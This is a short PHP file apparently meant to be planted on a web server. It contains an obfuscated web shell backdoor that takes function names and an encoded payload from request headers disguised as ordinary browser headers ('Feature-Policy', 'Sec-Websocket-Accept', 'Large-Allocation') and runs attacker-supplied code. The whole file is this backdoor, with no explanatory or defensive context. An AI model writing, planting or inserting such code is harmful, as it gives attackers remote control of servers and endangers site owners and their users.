<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $requests = $_HEADERS['Feature-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Large-Allocation']));
    $requests();
}